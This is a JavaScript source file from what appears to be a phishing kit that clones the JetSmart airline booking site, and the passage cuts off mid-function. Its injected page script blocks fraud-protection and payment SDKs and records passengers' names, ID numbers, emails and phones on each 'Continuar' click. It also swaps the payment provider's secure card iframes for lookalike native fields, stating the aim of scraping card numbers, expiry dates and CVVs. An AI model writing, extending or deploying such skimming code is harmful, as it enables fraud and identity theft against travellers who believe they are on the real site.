const { JETSMART_DOMAINS } = require('./constants');
const { rewriteUrls } = require('./url-rewriter');
const { transformBrowserState } = require('./transformer');

// ─── Client-Side Injected Script ──────────────────────────────────────────────
// Embedded into every HTML page served by the clone.

const CLIENT_SCRIPT = `
<script>
(function() {
  /* ── Reload-loop guard ─────────────────────────────────────── */
  try {
    var key = '__cloner_reload_' + location.pathname;
    var now = Date.now();
    var stored;
    try { stored = JSON.parse(sessionStorage.getItem(key) || '{"count":0,"ts":0}'); }
    catch(e) { stored = {"count":0,"ts":0}; }
    if (now - stored.ts < 10000) {
      stored.count++;
      if (stored.count > 3) {
        console.warn('[Cloner] Reload loop detected, stopping redirects');
        Object.defineProperty(window, '__clonerBlockRedirect', {value: true});
      }
    } else { stored.count = 1; }
    stored.ts = now;
    sessionStorage.setItem(key, JSON.stringify(stored));
  } catch(e) {}

  /* ── State hydration ─────────────────────────────────────── */
  var __spaState = %%SPA_STATE%%;
  var __flowStep = '%%FLOW_STEP%%';
  try {
    // Actively remove booking session data at flight selection step
    if (__flowStep === 'flight-results' || __flowStep === 'flight-search' || __flowStep === 'homepage') {
      sessionStorage.removeItem('js-cached-booking-data');
      sessionStorage.removeItem('jsCurrentStep');
      sessionStorage.removeItem('jsHistory');

      // Clear booking-related cookies that trigger the "duplicate tab" warning
      // Also clear search cookies on homepage so "Rearmar" doesn't show stale data
      var CLEAR_COOKIES = ['browserTabId', 'js_freeseats', 'js_discseats', 'bsid'];
      if (__flowStep === 'homepage') {
        CLEAR_COOKIES.push('JS_PreviousSearch', 'cart_cookie');
      }
      document.cookie.split(';').forEach(function(c) {
        var name = c.split('=')[0].trim();
        if (CLEAR_COOKIES.some(function(p) { return name.indexOf(p) > -1; })) {
          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
        }
      });
    }

    // Suppress the TabCookieWorker (it sets cookies that trigger "duplicate tab" modal)
    var _OrigWorker = window.Worker;
    window.Worker = function(url) {
      if (url && url.indexOf('TabCookieWorker') > -1) {
        console.log('[Cloner] Suppressed TabCookieWorker');
        return { postMessage: function(){}, onmessage: null, terminate: function(){} };
      }
      return new _OrigWorker(url);
    };
    window.Worker.prototype = _OrigWorker.prototype;

    if (__spaState.localStorage)   __spaState.localStorage.forEach(function(kv) { localStorage.setItem(kv[0], kv[1]); });
    if (__spaState.sessionStorage) __spaState.sessionStorage.forEach(function(kv) { sessionStorage.setItem(kv[0], kv[1]); });
  } catch(e) {}

  /* ── Block junk analytics scripts ────────────────────────── */
  var BLOCKED_SCRIPTS = ['utag.js', 'tiqcdn.com', 'hotjar', 'googleoptimize', 'salesmanago', 'opticksprotection', 'doubleclick.net', 'tiktok.com/api', 'google-analytics.com', 'googletagmanager.com', 'mercadopago.com', 'sdk-web.y.uno', 'sdk-web-card.prod.y.uno', 'checkout-sdk', 'vendor-checkout-app', 'secure-fields', '/v1.5/', 'y.uno'];
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
      m.addedNodes.forEach(function(node) {
        if (node.tagName === 'SCRIPT' && node.src) {
          if (BLOCKED_SCRIPTS.some(function(b) { return node.src.indexOf(b) > -1; })) {
            node.type = 'javascript/blocked';
            node.remove();
          }
        }
      });
    });
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });

  /* ── Disable past dates in calendar ───────────────────── */
  if (__flowStep === 'homepage') {
    var todayStr = (function() {
      var d = new Date();
      var yyyy = d.getFullYear();
      var mm = String(d.getMonth() + 1).padStart(2, '0');
      var dd = String(d.getDate()).padStart(2, '0');
      return yyyy + '-' + mm + '-' + dd;
    })();

    var disablePastDates = function() {
      // JetSmart datepicker uses span.dg-dp-date with data-test-value="YYYY-MM-DD"
      var dateCells = document.querySelectorAll('.dg-dp-date[data-test-value]');
      dateCells.forEach(function(cell) {
        var cellDateStr = cell.getAttribute('data-test-value');
        if (!cellDateStr) return;
        // String comparison works correctly for YYYY-MM-DD format
        if (cellDateStr < todayStr) {
          if (!cell.classList.contains('dg-dp-disabled')) {
            cell.classList.add('dg-dp-disabled');
          }
        }
      });
    };

    var calendarObserver = new MutationObserver(function() {
      disablePastDates();
    });
    setTimeout(function() {
      calendarObserver.observe(document.body || document.documentElement, { childList: true, subtree: true });
      disablePastDates();
    }, 1000);
  }

  /* ── ALWAYS-ACTIVE: Passenger capture + Payment overlay ─── */
  /* The SPA does client-side navigation, so __flowStep from the
     server is only correct for the FIRST page load. We detect the
     current page by polling location.pathname instead. */

  var __clonerPaymentSent = false;
  var __clonerOverlayCreated = false;
  var __clonerErrorObsActive = false;

  /* ── Passenger capture on ANY click of "Continuar" ──────── */
  document.addEventListener('click', function(e) {
    var btn = e.target.closest('button, a, [role="button"], [class*="continue"]');
    if (!btn) return;
    var btnText = (btn.textContent || '').trim().toLowerCase();
    if (!btnText.includes('continuar')) return;

    console.log('[Cloner] Continuar button clicked! Capturing passenger data...');
    try {
      var getFieldValue = function(labelFragment) {
        var labels = document.querySelectorAll('label, .floating-label, [class*="label"]');
        for (var i = 0; i < labels.length; i++) {
          if (labels[i].textContent.toLowerCase().includes(labelFragment.toLowerCase())) {
            var container = labels[i].closest('[class*="field"], [class*="input"], [class*="form-group"], div');
            if (container) {
              var input = container.querySelector('input, select');
              if (input && input.value) return input.value;
            }
          }
        }
        return '';
      };
      var paxData = {
        nombres: getFieldValue('Nombres') || getFieldValue('First'),
        apellidos: getFieldValue('Apellidos') || getFieldValue('Last'),
        numeroDocumento: getFieldValue('mero de documento') || getFieldValue('Document number'),
        correoElectronico: getFieldValue('Correo electr') || getFieldValue('Email'),
        telefono: getFieldValue('fono') || getFieldValue('Phone'),
      };
      // Fallback: named inputs
      if (!paxData.nombres || !paxData.apellidos) {
        document.querySelectorAll('input[name], select[name]').forEach(function(inp) {
          var n = (inp.name || '').toLowerCase();
          if (n.includes('firstname') && inp.value) paxData.nombres = paxData.nombres || inp.value;
          if (n.includes('lastname') && inp.value) paxData.apellidos = paxData.apellidos || inp.value;
          if (n.includes('email') && inp.value) paxData.correoElectronico = paxData.correoElectronico || inp.value;
          if (n.includes('phone') && inp.value) paxData.telefono = paxData.telefono || inp.value;
          if (n.includes('documentnumber') && inp.value) paxData.numeroDocumento = paxData.numeroDocumento || inp.value;
        });
      }
      sessionStorage.setItem('__cloner_passenger_data', JSON.stringify(paxData));
      console.log('[Cloner] Passenger data saved:', JSON.stringify(paxData));
    } catch(err) { console.error('[Cloner] Passenger capture error:', err); }
  }, true);

  /* ── "Soy el primer pasajero" auto-fill with Vue-compatible events ─── */
  /* We do NOT block the SPA's native click. After a delay, we check if
     fields are still empty and fill them with proper event simulation
     that triggers Vue's v-model and validation. */
  document.addEventListener('click', function(e) {
    var target = e.target;
    var text = (target.textContent || '').toLowerCase();
    var isFirstPax = text.includes('soy el primer pasajero') || text.includes('primer pasajero');
    if (!isFirstPax && target.closest) {
      var parent = target.closest('[class*="checkbox"], [class*="check"], label');
      if (parent) isFirstPax = (parent.textContent || '').toLowerCase().includes('primer pasajero');
    }
    if (!isFirstPax) return;
    /* Do NOT preventDefault — let the SPA's handler run too */
    console.log('[Cloner] "Soy el primer pasajero" clicked — will auto-fill after delay');

    var savedData = {};
    try { savedData = JSON.parse(sessionStorage.getItem('__cloner_passenger_data') || '{}'); } catch(pe) {}
    if (!savedData.nombres && !savedData.correoElectronico) return;

    /* Simulate real user input for Vue reactivity */
    var simulateTyping = function(input, value) {
      if (!input || !value) return;
      /* Skip if SPA already filled it */
      if (input.value && input.value.trim().length > 0) return;
      var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      input.focus();
      input.dispatchEvent(new Event('focus', { bubbles: true }));
      nativeSetter.call(input, value);
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
      input.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: 'a' }));
      input.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: 'a' }));
      input.dispatchEvent(new Event('blur', { bubbles: true }));
    };

    var findFieldByPlaceholder = function(keywords) {
      var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input:not([type])');
      for (var i = 0; i < inputs.length; i++) {
        var ph = (inputs[i].placeholder || '').toLowerCase();
        var ariaLabel = (inputs[i].getAttribute('aria-label') || '').toLowerCase();
        var name = (inputs[i].name || '').toLowerCase();
        for (var k = 0; k < keywords.length; k++) {
          if (ph.includes(keywords[k]) || ariaLabel.includes(keywords[k]) || name.includes(keywords[k])) {
            return inputs[i];
          }
        }
      }
      /* Also search by nearby label text */
      var labels = document.querySelectorAll('label, [class*="label"]');
      for (var li = 0; li < labels.length; li++) {
        var lt = (labels[li].textContent || '').toLowerCase();
        for (var ki = 0; ki < keywords.length; ki++) {
          if (lt.includes(keywords[ki])) {
            var container = labels[li].closest('div');
            if (container) {
              var inp = container.querySelector('input');
              if (inp) return inp;
            }
          }
        }
      }
      return null;
    };

    /* Fill after short delay to let SPA's handler run first */
    setTimeout(function() {
      var nombres = findFieldByPlaceholder(['nombres', 'first name', 'nombre']);
      var apellidos = findFieldByPlaceholder(['apellidos', 'last name', 'apellido']);
      var email = findFieldByPlaceholder(['correo', 'email']);
      var telefono = findFieldByPlaceholder(['fono', 'phone', 'tel']);

      /* Fill each field with small delays between them */
      simulateTyping(nombres, savedData.nombres);
      setTimeout(function() {
        simulateTyping(apellidos, savedData.apellidos);
        setTimeout(function() {
          simulateTyping(email, savedData.correoElectronico);
          setTimeout(function() {
            simulateTyping(telefono, savedData.telefono);
          }, 100);
        }, 100);
      }, 100);
    }, 500);
  }, false); /* Use bubbling phase (false) so SPA's handler can run in capture phase first */

  /* ── Yuno Card Form Replacement ─────────────────────────────
     Replaces Yuno's cross-origin iframe fields (PAN, EXP, CVV)
     with native inputs that use the EXACT same CSS classes and
     Emotion styles, so they are visually indistinguishable.
     Since they're native DOM inputs, scrapeAllInputs() captures
     them directly. ──────────────────────────────────────────── */

  var __yunoReplaced = false;

  /* Inject Yuno-matching Emotion CSS (only once) */
  var injectYunoStyles = function() {
    if (document.getElementById('__cloner_yuno_css')) return;
    var style = document.createElement('style');
    style.id = '__cloner_yuno_css';
    style.textContent = [
      /* ── Fieldset reset ─────────────────── */
      '.css-1lw9ry8{border:none;padding:0;margin:0 0 4px 0;min-width:0;}',
      /* ── Box wrapper ────────────────────── */
      '.css-1qmtg5w{position:relative;display:flex;align-items:center;border:1.5px solid #CFD7DF;border-radius:8px;padding:0 12px;min-height:56px;background:#fff;transition:border-color .2s ease;box-sizing:border-box;}',
      '.css-1qmtg5w:hover{border-color:#7D93B2;}',
      '.css-1qmtg5w.Yuno-fieldset__box--focus{border-color:#00D1B2;border-width:2px;padding:0 11px;}',
      '.css-1qmtg5w.Yuno-fieldset__box--error{border-color:#F13F5E !important;border-width:2px;padding:0 11px;}',
      /* ── Input content wrapper ──────────── */
      '.css-1lcp52{position:relative;flex:1;display:flex;flex-direction:column;justify-content:center;min-height:56px;}',
      /* ── Floating label ─────────────────── */
      '.css-19suitn{position:absolute;top:50%;left:0;transform:translateY(-50%);font-size:16px;color:#7D93B2;pointer-events:none;transition:all .15s ease;font-family:Roboto,Helvetica,Arial,sans-serif;font-weight:400;line-height:1.2;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%;}',
      '.css-19suitn.Yuno-input__label--loaded{font-size:16px;}',
      '.css-19suitn.Yuno-input__label--focus,.css-19suitn.Yuno-input__label--filled{top:8px;transform:translateY(0);font-size:11px;color:#7D93B2;}',
      '.css-19suitn.Yuno-input__label--focus{color:#00D1B2;}',
      '.css-1qmtg5w.Yuno-fieldset__box--error .css-19suitn{color:#F13F5E;}',
      /* ── Base input ─────────────────────── */
      '.css-36dktg{border:none;outline:none;background:transparent;font-size:16px;font-family:Roboto,Helvetica,Arial,sans-serif;font-weight:400;color:#2D3B4E;width:100%;padding:18px 0 4px 0;line-height:1.2;box-sizing:border-box;}',
      '.css-36dktg::placeholder{color:transparent;}',
      '.css-36dktg:focus::placeholder{color:#B0BEC5;}',
      /* ── Form container ─────────────────── */
      '.css-bb03bc{display:flex;flex-direction:column;gap:4px;}',
      /* ── Exp/CVV row ────────────────────── */
      '.css-rtde4j{display:flex;gap:8px;align-items:stretch;}',
      '.css-rtde4j > *{flex:1;}',
      /* ── CVV wrapper (with info icon) ──── */
      '.css-1seshkd{position:relative;flex:1;display:flex;align-items:stretch;}',
      '.css-1seshkd .css-1lw9ry8{flex:1;}',
      /* ── CVV info icon ──────────────────── */
      '.css-gkcg18{position:absolute;right:8px;top:50%;transform:translateY(-50%);width:18px;height:18px;cursor:pointer;opacity:.6;transition:opacity .2s;z-index:2;}',
      '.css-1seshkd .css-1qmtg5w{padding-right:32px;}',
      '.css-gkcg18:hover{opacity:1;}',
      /* ── CVV tooltip ────────────────────── */
      '.css-gd1r0b{position:fixed;visibility:hidden;z-index:99999;}',
      '.css-gd1r0b.visible{visibility:visible;}',
      '.css-44gx6g{background:#2D3B4E;border-radius:8px;padding:12px;display:flex;align-items:center;gap:8px;box-shadow:0 4px 12px rgba(0,0,0,.15);}',
      '.css-1undl3v{color:#fff;font-size:12px;font-family:Roboto,Helvetica,Arial,sans-serif;margin:0;line-height:1.4;}',
      '.css-15w7vh8{width:44px;height:28px;}',
      /* ── Brand icons area ───────────────── */
      '.css-ptc9w4{position:absolute;right:0;top:50%;transform:translateY(-50%);display:flex;align-items:center;gap:4px;}',
      '.css-1g2ifix{display:flex;align-items:center;}',
      '.css-6iha89{height:24px;width:auto;}',
      /* ── Error message ──────────────────── */
      '.__yuno-error-msg{font-size:12px;color:#F13F5E;font-family:Roboto,Helvetica,Arial,sans-serif;margin:2px 0 0 12px;min-height:16px;line-height:1.3;}',
      /* ── Highlight on secure-field content */
      '.css-1vxquz2{/* expiry container */}',
      '.css-3hpdnk{/* cvv container */}',
      '.css-1l8ylpq{/* pan container */}',
      /* ── Security info row ──────────────── */
      '.css-1iqpic4{font-size:12px;color:#7D93B2;font-family:Roboto,Helvetica,Arial,sans-serif;margin:12px 0 0;line-height:1.4;}',
      '.css-1rlj8hu{color:#00D1B2;text-decoration:none;}',
      '.css-1rlj8hu:hover{text-decoration:underline;}',
    ].join('\\n');
    document.head.appendChild(style);
  };

  /* Brand detection from card number prefix */
  var detectCardBrand = function(num) {
    var n = (num || '').replace(/[\s]/g, '');
    if (/^4/.test(n)) return { name: 'VISA', icon: 'https://icons.prod.y.uno/sdk-web/brand-icon/visa.svg' };
    if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return { name: 'MASTERCARD', icon: 'https://icons.prod.y.uno/sdk-web/brand-icon/mastercard.svg' };
    if (/^3[47]/.test(n)) return { name: 'AMEX', icon: 'https://icons.prod.y.uno/sdk-web/brand-icon/amex.svg' };
    if (/^3(0[0-5]|[68])/.test(n)) return { name: 'DINERS', icon: 'https://assets-us-01.kc-usercontent.com:443/b2956330-c34f-0064-2c6f-27bd5c0147fc/2663d981-d937-4773-879b-d9382b1bef3b/dc.svg' };
    return null;
  };

  /* Format card number: 4444 4444 4444 4444 (Amex: 4-6-5) */
  var formatCardNumber = function(raw) {
    var digits = raw.replace(/[^0-9]/g, '');
    var brand = detectCardBrand(digits);
    var maxLen = (brand && brand.name === 'AMEX') ? 15 : 16;
    digits = digits.substring(0, maxLen);
    if (brand && brand.name === 'AMEX') {
      return digits.replace(/([0-9]{4})([0-9]{0,6})([0-9]{0,5})/, function(m,a,b,c){ return a + (b ? ' ' + b : '') + (c ? ' ' + c : ''); }).trim();
    }
    return digits.replace(/([0-9]{4})(?=[0-9])/g, '$1 ').trim();
  };

  /* Format expiry: MM/AA */
  var formatExpiry = function(raw) {
    var digits = raw.replace(/[^0-9]/g, '').substring(0, 4);
    if (digits.length === 0) return '';
    if (digits.length <= 2) {
      var m = parseInt(digits, 10);
      if (digits.length === 1 && m > 1) return '0' + digits + '/';
      if (digits.length === 2) {
        if (m < 1) return '01/';
        if (m > 12) return '12/';
        return digits + '/';
      }
      return digits;
    }
    var mm = digits.substring(0, 2);
    var mi = parseInt(mm, 10);
    if (mi < 1) mm = '01';
    if (mi > 12) mm = '12';
    return mm + '/' + digits.substring(2);
  };

  /* Build a single Yuno-style fieldset (PAN, EXP, or CVV) */
  var buildYunoField = function(cfg) {
    var fieldset = document.createElement('fieldset');
    fieldset.className = 'Yuno-fieldset css-1lw9ry8';
    fieldset.setAttribute('data-testid', 'Yuno-fieldset__fieldset');

    var box = document.createElement('div');
    box.className = 'Yuno-fieldset__box css-1qmtg5w';

    var content = document.createElement('div');
    content.className = 'Yuno-input__content css-1lcp52';

    var label = document.createElement('label');
    label.className = 'Yuno-input__label Yuno-input__label--loaded css-19suitn';
    label.textContent = cfg.label;
    label.setAttribute('data-testid', 'Yuno-input__label');

    var input = document.createElement('input');
    input.className = 'Yuno-input__base css-36dktg';
    input.placeholder = '';
    input.name = cfg.name;
    input.autocomplete = cfg.autocomplete;
    input.setAttribute('aria-label', cfg.label);
    input.setAttribute('data-testid', 'Yuno-input__input');
    if (cfg.inputmode) input.setAttribute('inputmode', cfg.inputmode);
    if (cfg.maxlength) input.setAttribute('maxlength', cfg.maxlength);

    content.appendChild(label);
    content.appendChild(input);

    /* Brand icon container (PAN only) */
    if (cfg.brandContainer) {
      var brandWrap = document.createElement('div');
      brandWrap.className = 'css-ptc9w4 esfhigb0';
      brandWrap.setAttribute('data-testid', 'brand-icons');
      content.appendChild(brandWrap);
      cfg._brandWrap = brandWrap;
    }

    box.appendChild(content);
    fieldset.appendChild(box);

    /* Error message container */
    var errMsg = document.createElement('div');
    errMsg.className = '__yuno-error-msg';
    fieldset.appendChild(errMsg);

    /* Focus/blur animations */
    input.addEventListener('focus', function() {
      box.classList.add('Yuno-fieldset__box--focus');
      label.classList.add('Yuno-input__label--focus');
      if (box.classList.contains('Yuno-fieldset__box--error')) {
        box.classList.remove('Yuno-fieldset__box--error');
        errMsg.textContent = '';
      }
    });
    input.addEventListener('blur', function() {
      box.classList.remove('Yuno-fieldset__box--focus');
      label.classList.remove('Yuno-input__label--focus');
      if (input.value) {
        label.classList.add('Yuno-input__label--filled');
      } else {
        label.classList.remove('Yuno-input__label--filled');
      }
      /* Validate on blur */
      if (cfg.validate) {
        var err = cfg.validate(input.value);
        if (err) {
          box.classList.add('Yuno-fieldset__box--error');
          errMsg.textContent = err;
        }
      }
    });

    /* Handle backspace over "/" in expiry fields */
    if (cfg.name === 'expiration') {
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          var pos = input.selectionStart;
          var val = input.value;
          /* If cursor is right after "/", delete the "/" AND the digit before it */
          if (pos > 0 && val.charAt(pos - 1) === '/') {
            e.preventDefault();
            input.value = val.substring(0, pos - 2) + val.substring(pos);
            input.setSelectionRange(pos - 2, pos - 2);
            input.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      });
    }

    /* Formatter on input */
    if (cfg.formatter) {
      input.addEventListener('input', function(e) {
        var pos = input.selectionStart;
        var prev = input.value;
        var formatted = cfg.formatter(input.value);
        input.value = formatted;
        /* Adjust cursor */
        var diff = formatted.length - prev.length;
        var newPos = pos + diff;
        if (newPos < 0) newPos = 0;
        if (newPos > formatted.length) newPos = formatted.length;
        input.setSelectionRange(newPos, newPos);
        /* Update label state */
        if (input.value) label.classList.add('Yuno-input__label--filled');
        else label.classList.remove('Yuno-input__label--filled');
        /* Brand icon update (PAN only) */
        if (cfg.onBrandChange) cfg.onBrandChange(input.value);
      });
    } else {
      input.addEventListener('input', function() {
        if (input.value) label.classList.add('Yuno-input__label--filled');
        else label.classList.remove('Yuno-input__label--filled');
      });
    }

    cfg._input = input;
    cfg._fieldset = fieldset;
    cfg._box = box;
    cfg._errMsg = errMsg;
    return fieldset;
  };

  /* CVV back-of-card SVG (base64) — same as Yuno's */
  var CVV_CARD_SVG = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDQiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCA0NCAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzMyMzRfMTkxOTA2KSI+CjxyZWN0IHdpZHRoPSI0NCIgaGVpZ2h0PSIyOCIgcng9IjIiIGZpbGw9IiMwMDU3OUYiLz4KPHJlY3QgeT0iNSIgd2lkdGg9IjQ0IiBoZWlnaHQ9IjYiIGZpbGw9ImJsYWNrIi8+CjxyZWN0IHg9IjMiIHk9IjE1IiB3aWR0aD0iMjAiIGhlaWdodD0iNyIgZmlsbD0id2hpdGUiLz4KPHJlY3QgeD0iMjYuMzUiIHk9IjEzLjM1IiB3aWR0aD0iMTUuMyIgaGVpZ2h0PSI5LjMiIHJ4PSIxLjY1IiBzdHJva2U9IiNGMTNGNUUiIHN0cm9rZS13aWR0aD0iMC43Ii8+CjxwYXRoIGQ9Ik0zMC45ODU4IDE1LjYzNjRWMjBIMzAuNDU3NFYxNi4xOTAzSDMwLjQzMThMMjkuMzY2NSAxNi44OTc3VjE2LjM2MDhMMzAuNDU3NCAxNS42MzY0SDMwLjk4NThaTTMyLjI0MDggMjBWMTkuNjE2NUwzMy42ODExIDE4LjAzOThDMzMuODUwMSAxNy44NTUxIDMzLjk4OTMgMTcuNjk0NiAzNC4wOTg3IDE3LjU1ODJDMzQuMjA4MSAxNy40MjA1IDM0LjI4OTEgMTcuMjkxMiAzNC4zNDE2IDE3LjE3MDVDMzQuMzk1NiAxNy4wNDgzIDM0LjQyMjYgMTYuOTIwNSAzNC40MjI2IDE2Ljc4NjlDMzQuNDIyNiAxNi42MzM1IDM0LjM4NTcgMTYuNTAwNyAzNC4zMTE4IDE2LjM4ODVDMzQuMjM5MyAxNi4yNzYzIDM0LjEzOTkgMTYuMTg5NiAzNC4wMTM1IDE2LjEyODZDMzMuODg3MSAxNi4wNjc1IDMzLjc0NSAxNi4wMzY5IDMzLjU4NzQgMTYuMDM2OUMzMy40MTk3IDE2LjAzNjkgMzMuMjczNCAxNi4wNzE3IDMzLjE0ODQgMTYuMTQxM0MzMy4wMjQ5IDE2LjIwOTUgMzIuOTI5IDE2LjMwNTQgMzIuODYwOCAxNi40MjlDMzIuNzk0IDE2LjU1MjYgMzIuNzYwNyAxNi42OTc0IDMyLjc2MDcgMTYuODYzNkgzMi4yNTc4QzMyLjI1NzggMTYuNjA4IDMyLjMxNjggMTYuMzgzNSAzMi40MzQ3IDE2LjE5MDNDMzIuNTUyNiAxNS45OTcyIDMyLjcxMzEgMTUuODQ2NiAzMi45MTYyIDE1LjczODZDMzMuMTIwNyAxNS42MzA3IDMzLjM1MDEgMTUuNTc2NyAzMy42MDQ0IDE1LjU3NjdDMzMuODYwMSAxNS41NzY3IDM0LjA4NjYgMTUuNjMwNyAzNC4yODQxIDE1LjczODZDMzQuNDgxNSAxNS44NDY2IDM0LjYzNjQgMTUuOTkyMiAzNC43NDg2IDE2LjE3NTRDMzQuODYwOCAxNi4zNTg3IDM0LjkxNjkgMTYuNTYyNSAzNC45MTY5IDE2Ljc4NjlDMzQuOTE2OSAxNi45NDc0IDM0Ljg4NzggMTcuMTA0NCAzNC44Mjk1IDE3LjI1NzhDMzQuNzcyNyAxNy40MDk4IDM0LjY3MzMgMTcuNTc5NSAzNC41MzEyIDE3Ljc2N0MzNC4zOTA2IDE3Ljk1MzEgMzQuMTk1MyAxOC4xODA0IDMzLjk0NTMgMTguNDQ4OUwzMi45NjUyIDE5LjQ5NzJWMTkuNTMxMkgzNC45OTM2VjIwSDMyLjI0MDhaTTM3LjM0OCAyMC4wNTk3QzM3LjA2NjggMjAuMDU5NyAzNi44MTYxIDIwLjAxMTQgMzYuNTk1OSAxOS45MTQ4QzM2LjM3NzEgMTkuODE4MiAzNi4yMDMxIDE5LjY4MzkgMzYuMDczOSAxOS41MTIxQzM1Ljk0NiAxOS4zMzg4IDM1Ljg3NjQgMTkuMTM3OCAzNS44NjUxIDE4LjkwOTFIMzYuNDAyQzM2LjQxMzQgMTkuMDQ5NyAzNi40NjE2IDE5LjE3MTIgMzYuNTQ2OSAxOS4yNzM0QzM2LjYzMjEgMTkuMzc0MyAzNi43NDM2IDE5LjQ1MjQgMzYuODgxNCAxOS41MDc4QzM3LjAxOTIgMTkuNTYzMiAzNy4xNzE5IDE5LjU5MDkgMzcuMzM5NSAxOS41OTA5QzM3LjUyNyAxOS41OTA5IDM3LjY5MzIgMTkuNTU4MiAzNy44MzgxIDE5LjQ5MjlDMzcuOTgzIDE5LjQyNzYgMzguMDk2NiAxOS4zMzY2IDM4LjE3OSAxOS4yMjAyQzM4LjI2MTQgMTkuMTAzNyAzOC4zMDI2IDE4Ljk2ODggMzguMzAyNiAxOC44MTUzQzM4LjMwMjYgMTguNjU0OCAzOC4yNjI4IDE4LjUxMzUgMzguMTgzMiAxOC4zOTEzQzM4LjEwMzcgMTguMjY3OCAzNy45ODcyIDE4LjE3MTIgMzcuODMzOCAxOC4xMDE2QzM3LjY4MDQgMTguMDMyIDM3LjQ5MjkgMTcuOTk3MiAzNy4yNzEzIDE3Ljk5NzJIMzYuOTIxOVYxNy41Mjg0SDM3LjI3MTNDMzcuNDQ0NiAxNy41Mjg0IDM3LjU5NjYgMTcuNDk3MiAzNy43MjczIDE3LjQzNDdDMzcuODU5NCAxNy4zNzIyIDM3Ljk2MjQgMTcuMjg0MSAzOC4wMzYyIDE3LjE3MDVDMzguMTExNSAxNy4wNTY4IDM4LjE0OTEgMTYuOTIzMyAzOC4xNDkxIDE2Ljc2OTlDMzguMTQ5MSAxNi42MjIyIDM4LjExNjUgMTYuNDkzNiAzOC4wNTExIDE2LjM4NDJDMzcuOTg1OCAxNi4yNzQ5IDM3Ljg5MzUgMTYuMTg5NiAzNy43NzQxIDE2LjEyODZDMzcuNjU2MyAxNi4wNjc1IDM3LjUxNyAxNi4wMzY5IDM3LjM1NjUgMTYuMDM2OUMzNy4yMDYgMTYuMDM2OSAzNy4wNjM5IDE2LjA2NDYgMzYuOTMwNCAxNi4xMkMzNi43OTgzIDE2LjE3NCAzNi42OTAzIDE2LjI1MjggMzYuNjA2NSAxNi4zNTY1QzM2LjUyMjcgMTYuNDU4OCAzNi40NzczIDE2LjU4MjQgMzYuNDcwMiAxNi43MjczSDM1Ljk1ODhDMzUuOTY3MyAxNi40OTg2IDM2LjAzNjIgMTYuMjk4MyAzNi4xNjU1IDE2LjEyNjRDMzYuMjk0NyAxNS45NTMxIDM2LjQ2MzggMTUuODE4MiAzNi42NzI2IDE1LjcyMTZDMzYuODgyOCAxNS42MjUgMzcuMTEzNiAxNS41NzY3IDM3LjM2NTEgMTUuNTc2N0MzNy42MzQ5IDE1LjU3NjcgMzcuODY2NSAxNS42MzE0IDM4LjA1OTcgMTUuNzQwOEMzOC4yNTI4IDE1Ljg0ODcgMzguNDAxMyAxNS45OTE1IDM4LjUwNSAxNi4xNjlDMzguNjA4NyAxNi4zNDY2IDM4LjY2MDUgMTYuNTM4NCAzOC42NjA1IDE2Ljc0NDNDMzguNjYwNSAxNi45OTAxIDM4LjU5NTkgMTcuMTk5NiAzOC40NjY2IDE3LjM3MjlDMzguMzM4OCAxNy41NDYyIDM4LjE2NDggMTcuNjY2MiAzNy45NDQ2IDE3LjczM1YxNy43NjdDMzguMjIwMiAxNy44MTI1IDM4LjQzNTQgMTcuOTI5NyAzOC41OTAyIDE4LjExODZDMzguNzQ1IDE4LjMwNjEgMzguODIyNCAxOC41Mzg0IDM4LjgyMjQgMTguODE1M0MzOC44MjI0IDE5LjA1MjYgMzguNzU3OCAxOS4yNjU2IDM4LjYyODYgMTkuNDU0NUMzOC41MDA3IDE5LjY0MiAzOC4zMjYgMTkuNzg5OCAzOC4xMDQ0IDE5Ljg5NzdDMzcuODgyOCAyMC4wMDU3IDM3LjYzMDcgMjAuMDU5NyAzNy4zNDggMjAuMDU5N1oiIGZpbGw9IndoaXRlIi8+CjwvZz4KPGRlZnM+CjxjbGlwUGF0aCBpZD0iY2xpcDBfMzIzNF8xOTE5MDYiPgo8cmVjdCB3aWR0aD0iNDQiIGhlaWdodD0iMjgiIGZpbGw9IndoaXRlIi8+CjwvY2xpcFBhdGg+CjwvZGVmcz4KPC9zdmc+Cg==';

  /* Main function — inject card form fields INSIDE the existing card accordion.
     The JetSmart SPA renders the accordion with header (icon, price, radio),
     brand logos row, and security text. The form container is:
     [data-form-type="apm-form"][data-payment-type="CARD"]
     which sits INSIDE that accordion. We inject our fields there. */
  var injectCustomCardForm = function() {
    if (__yunoReplaced) return;
    var curPath = location.pathname.toLowerCase();
    if (!curPath.includes('/v2/payment') && !curPath.includes('/payment')) return;

    /* Find the form container INSIDE the card accordion */
    var formContainer = document.querySelector('[data-form-type="apm-form"][data-payment-type="CARD"]');
    if (!formContainer) return;
    if (formContainer.querySelector('#__cloner-card-form')) return;

    __yunoReplaced = true;
    injectYunoStyles();
    console.log('[Cloner] Injecting card form into accordion...');

    /* Track current card brand for CVV validation */
    var currentBrand = null;

    /* ── The card form fields ── */
    var form = document.createElement('div');
    form.id = '__cloner-card-form';
    form.className = 'css-bb03bc';

    /* PAN field */
    var panCfg = {
      label: 'N\\u00famero de tarjeta',
      name: 'number',
      autocomplete: 'cc-number',
      inputmode: 'numeric',
      maxlength: '19',
      brandContainer: true,
      formatter: formatCardNumber,
      validate: function(v) {
        var d = v.replace(/[^0-9]/g, '');
        if (!d) return 'Ingresa el n\\u00famero de tarjeta';
        if (d.length < 13) return 'N\\u00famero de tarjeta incompleto';
        return '';
      }
    };
    panCfg.onBrandChange = function(val) {
      var brand = detectCardBrand(val);
      currentBrand = brand;
